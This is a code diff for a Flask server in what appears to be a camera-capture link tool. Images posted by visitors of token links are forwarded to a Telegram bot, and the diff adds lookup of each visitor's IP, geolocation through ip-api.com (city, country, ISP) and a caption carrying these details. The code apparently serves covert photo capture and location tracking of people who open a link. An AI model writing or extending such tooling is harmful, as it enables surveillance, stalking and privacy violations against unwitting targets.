@@ -4,7 +4,7 @@ import base64
 import uuid
 import threading
 import requests
-from flask import Flask, request, jsonify, send_from_directory, render_template
+from flask import Flask, request, jsonify, send_from_directory, render_template, make_response
 
 app = Flask(__name__)
 
@@ -35,7 +35,6 @@ def index():
 
 @app.route("/img/<token>.jpg")
 def serve_img(token):
-    from flask import make_response
     response = make_response(send_from_directory(IMG_DIR, f"{token}.jpg"))
     response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     return response
@@ -45,6 +44,7 @@ def capture():
     data = request.get_json()
     token = data.get("token")
     image_b64 = data.get("image")
+    
     m = load_map()
     chat_id = m.get(token)
     if not chat_id:
@@ -56,13 +56,38 @@ def capture():
     with open(os.path.join(RECV_DIR, fname), "wb") as f:
         f.write(img_bytes)
 
+    # --- IP & Location Fetch kar rahe hain ---
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+    
+    try:
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
+        city = ip_info.get('city', 'Unknown')
+        country = ip_info.get('country', 'Unknown')
+        isp = ip_info.get('isp', 'Unknown')
+    except:
+        city, country, isp = "Unknown", "Unknown", "Unknown"
+
     ua = request.headers.get("User-Agent", "")[:100]
+    
+    # --- Message format banaya ---
+    caption_text = (
+        f"📸 **New Capture**\n"
+        f"🔢 IP: `{ip}`\n"
+        f"📍 Location: {city}, {country}\n"
+        f"📡 ISP: {isp}\n"
+        f"🖥️ UA: {ua}\n"
+        f"🔗 Token: `{token}`"
+    )
+
     try:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
             data={
                 "chat_id": chat_id,
-                "caption": f"📸 New capture!\nToken: {token}\nUA: {ua}",
+                "caption": caption_text,
+                "parse_mode": "Markdown"
             },
             files={"photo": (fname, img_bytes, "image/jpeg")},
             timeout=20,
